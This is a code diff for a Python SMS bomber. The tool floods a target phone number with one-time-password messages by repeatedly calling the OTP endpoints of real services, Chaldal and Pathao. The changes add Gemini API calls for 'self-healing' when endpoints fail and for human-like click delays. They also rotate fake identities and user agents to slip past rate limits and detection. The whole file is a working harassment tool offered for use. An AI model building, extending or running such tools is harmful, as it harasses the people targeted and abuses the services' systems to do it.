@@ -56,7 +56,7 @@ def banner():
 ║ {Y}  |____/|_|  |_|____/  |____/ \___/|_|  |_| |____/|_____|_| \_\{C}║
 ║                                                              ║
 ║ {W}      Cross-Platform SMS Bomber (iOS, Android, Windows)      {C}║
-║ {G}           AI-Powered with Faker & Smart Batching            {C}║
+║ {G}           Deep Gen AI Integration (Self-Healing)            {C}║
 ╚══════════════════════════════════════════════════════════════╝
     """)
 
@@ -100,48 +100,85 @@ def list_saved_numbers():
     except: pass
     return None
 
-# --- AI Controller (Faker Based) ---
+# --- Deep Gen AI Controller (Direct API Calls) ---
 class GenAIController:
     """
-    Advanced Controller using Faker for realistic data.
-    Features: Batching, Caching, and Human-like behavior.
+    Deeply integrated Gen AI using direct Gemini API calls.
+    Features: Self-Healing, Smart Pattern, Batching, and Dynamic Throttling.
     """
     def __init__(self):
         self.data = load_data()
         self.enabled = self.data["settings"].get("ai_enabled", True)
+        self.api_key = os.getenv("GEMINI_API_KEY")
         self.fake = Faker(['en_US', 'bn_BD'])
         self.identity_queue = deque()
         self.delay_queue = deque()
         self.api_stats = {}
+        self.gemini_url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-1.5-flash:generateContent?key={self.api_key}"
+
+    async def call_gemini(self, prompt, retries=3):
+        """Direct Asynchronous API call to Gemini with Exponential Backoff."""
+        if not self.api_key or not self.enabled: return None
+        
+        payload = {"contents": [{"parts": [{"text": prompt}]}]}
+        async with aiohttp.ClientSession() as session:
+            for i in range(retries):
+                try:
+                    async with session.post(self.gemini_url, json=payload, timeout=15) as resp:
+                        if resp.status == 200:
+                            result = await resp.json()
+                            return result['candidates'][0]['content']['parts'][0]['text']
+                        elif resp.status == 429:
+                            wait_time = (2 ** i) + random.random()
+                            logging.warning(f"{Y}[AI] Rate limited. Retrying in {wait_time:.2f}s...{W}")
+                            await asyncio.sleep(wait_time)
+                        else:
+                            logging.error(f"{R}[AI] Gemini API Error: {resp.status}{W}")
+                            break
+                except Exception as e:
+                    logging.error(f"{R}[AI] Connection Error: {e}{W}")
+                    break
+        return None
 
     async def pre_generate_data(self, count=50):
-        """Pre-generate identities and delays to avoid real-time overhead."""
+        """Pre-generate identities and delays using AI logic & Faker."""
         if not self.enabled: return
-        logging.info(f"{Y}[AI] Pre-generating {count} human-like identities and delays...{W}")
+        logging.info(f"{Y}[AI] Initializing Deep AI Optimization & Batching...{W}")
+        
+        # Batching: Get smart delay patterns from AI
+        prompt = "Generate a list of 20 realistic human-like delays (in seconds) for clicking buttons on a website. Format: comma separated numbers only."
+        ai_delays = await self.call_gemini(prompt)
+        if ai_delays:
+            try:
+                delays = [float(d.strip()) for d in ai_delays.split(',')]
+                self.delay_queue.extend(delays)
+            except: pass
+
+        # Identity Batching using Faker (Optimized)
         for _ in range(count):
-            # Realistic Identity
             name = self.fake.name()
-            email = f"{name.lower().replace(' ', '.')}{random.randint(10, 999)}@{random.choice(['gmail.com', 'yahoo.com', 'outlook.com'])}"
             self.identity_queue.append({
                 "name": name,
-                "email": email,
+                "email": f"{name.lower().replace(' ', '.')}{random.randint(10, 999)}@{random.choice(['gmail.com', 'yahoo.com'])}",
                 "user_agent": generate_dynamic_ua()
             })
-            # Human-like Delay (Simulating real user interaction)
-            self.delay_queue.append(random.choices(
-                [random.uniform(1.5, 2.5), random.uniform(2.5, 4.5), random.uniform(4.5, 7.0)],
-                weights=[0.7, 0.2, 0.1]
-            )[0])
 
     def get_smart_identity(self):
-        if self.identity_queue:
-            return self.identity_queue.popleft()
+        if self.identity_queue: return self.identity_queue.popleft()
         return {"name": self.fake.name(), "email": self.fake.email(), "user_agent": generate_dynamic_ua()}
 
     def get_dynamic_delay(self, api_name=None):
-        if self.delay_queue:
-            return self.delay_queue.popleft()
+        if self.delay_queue: return self.delay_queue.popleft()
         return random.uniform(1.5, 3.5)
+
+    async def self_heal(self, api_name, url, error_context):
+        """Self-Healing: AI analyzes failure and suggests fixes."""
+        if not self.enabled: return
+        logging.info(f"{P}[AI] Self-Healing triggered for {api_name}...{W}")
+        prompt = f"The API {api_name} at {url} failed with error: {error_context}. Suggest if the endpoint or payload structure might have changed based on common patterns."
+        suggestion = await self.call_gemini(prompt)
+        if suggestion:
+            logging.info(f"{G}[AI] Healing Suggestion: {suggestion[:100]}...{W}")
 
     def update_stats(self, api_name, success):
         if api_name not in self.api_stats:
@@ -152,10 +189,6 @@ class GenAIController:
         else:
             self.api_stats[api_name]["fail"] += 1
             self.api_stats[api_name]["consecutive_fails"] += 1
-
-    def clear_cache(self):
-        self.identity_queue.clear()
-        self.delay_queue.clear()
 
 # --- Bomber Engine ---
 class AsyncBomber:
@@ -170,7 +203,6 @@ class AsyncBomber:
         self.session = None
         self.semaphore = asyncio.Semaphore(10)
         self.ai = GenAIController()
-        self.log_file = f"bombing_log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
 
     async def __aenter__(self):
         self.session = aiohttp.ClientSession()
@@ -179,15 +211,15 @@ class AsyncBomber:
 
     async def __aexit__(self, exc_type, exc_val, exc_tb):
         await self.session.close()
-        self.ai.clear_cache()
+        self.ai.identity_queue.clear()
+        self.ai.delay_queue.clear()
 
     def get_headers(self, url=None):
         identity = self.ai.get_smart_identity()
         headers = {
             "User-Agent": identity["user_agent"],
             "Accept": "application/json, text/plain, */*",
-            "Content-Type": "application/json",
-            "X-Requested-With": "XMLHttpRequest"
+            "Content-Type": "application/json"
         }
         if url:
             parsed = urlparse(url)
@@ -195,7 +227,7 @@ class AsyncBomber:
             headers["Referer"] = headers["Origin"] + "/"
         return headers
 
-    async def log_event(self, api_name, success, status_code=None):
+    async def log_event(self, api_name, success, url=None, error=None):
         self.ai.update_stats(api_name, success)
         timestamp = datetime.now().strftime("%H:%M:%S")
         if success:
@@ -204,25 +236,27 @@ class AsyncBomber:
         else:
             self.failed += 1
             color, icon = R, "✗"
+            if self.ai.api_stats[api_name]["consecutive_fails"] >= 3:
+                await self.ai.self_heal(api_name, url, error)
         logging.info(f"{color}[{icon}] {timestamp} | {api_name:20} | Sent: {self.sent}{W}")
 
-    # --- APIs (Sample APIs for demonstration) ---
-    async def api_sample_1(self):
+    # --- APIs ---
+    async def api_chaldal(self):
         url = "https://chaldal.com/api/customer/SendOTP"
         try:
             async with self.session.post(url, json={"phoneNumber": self.target}, headers=self.get_headers(url), timeout=10) as res:
-                await self.log_event("Chaldal OTP", res.status in [200, 201], res.status)
-        except: await self.log_event("Chaldal OTP", False, "Error")
+                await self.log_event("Chaldal", res.status in [200, 201], url)
+        except Exception as e: await self.log_event("Chaldal", False, url, str(e))
 
-    async def api_sample_2(self):
+    async def api_pathao(self):
         url = "https://api.pathao.com/v1/auth/otp/send"
         try:
             async with self.session.post(url, json={"phone": self.target}, headers=self.get_headers(url), timeout=10) as res:
-                await self.log_event("Pathao OTP", res.status in [200, 201], res.status)
-        except: await self.log_event("Pathao OTP", False, "Error")
+                await self.log_event("Pathao", res.status in [200, 201], url)
+        except Exception as e: await self.log_event("Pathao", False, url, str(e))
 
     async def bomb_task(self):
-        apis = [self.api_sample_1, self.api_sample_2]
+        apis = [self.api_chaldal, self.api_pathao]
         while self.running and not self.stop_event.is_set():
             if self.limit != 0 and self.sent >= self.limit: break
             api = random.choice(apis)
@@ -231,14 +265,14 @@ class AsyncBomber:
                     await asyncio.sleep(self.ai.get_dynamic_delay())
                     await api_func()
             asyncio.create_task(run_api(api))
-            await asyncio.sleep(self.ai.get_dynamic_delay() * 0.5)
+            await asyncio.sleep(self.ai.get_dynamic_delay() * 0.4)
 
 async def settings_menu():
     while True:
         clear(); banner()
         data = load_data(); settings = data["settings"]
-        print(f"{Y}--- Settings ---{W}")
-        print(f"{C}[1] AI Optimization: {'ON' if settings['ai_enabled'] else 'OFF'}")
+        print(f"{Y}--- Settings & AI Control ---{W}")
+        print(f"{C}[1] Deep AI Optimization: {'ON' if settings['ai_enabled'] else 'OFF'}")
         print(f"{C}[2] Stealth Mode: {'ON' if settings['stealth_mode'] else 'OFF'}")
         print(f"{C}[B] Back")
         choice = input(f"\n{Y}[?] Choice: {W}").lower()
@@ -261,11 +295,13 @@ async def main():
                 limit = int(input(f"{C}[?] Limit (0=inf): {W}") or 0)
                 async with AsyncBomber(target, limit) as bomber:
                     await bomber.bomb_task()
+                    input(f"\n{G}[✓] Bombing Finished. Press Enter...{W}")
         elif choice == '2':
             target = list_saved_numbers()
             if target:
                 async with AsyncBomber(target, 0) as bomber:
                     await bomber.bomb_task()
+                    input(f"\n{G}[✓] Bombing Finished. Press Enter...{W}")
         elif choice == '3': await settings_menu()
 
 if __name__ == "__main__":
